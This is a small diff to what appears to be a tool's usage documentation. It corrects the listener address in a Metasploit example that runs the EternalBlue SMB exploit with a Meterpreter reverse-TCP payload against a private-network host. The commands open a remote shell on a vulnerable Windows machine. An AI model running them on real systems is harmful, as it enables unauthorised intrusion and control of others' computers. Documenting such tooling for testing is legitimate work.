@@ -61,7 +61,7 @@ lmv [flags]
 ```sh
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.100
-set LHOST 192.168.2.00
+set LHOST 192.168.1.50
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 run -j -z
 ```
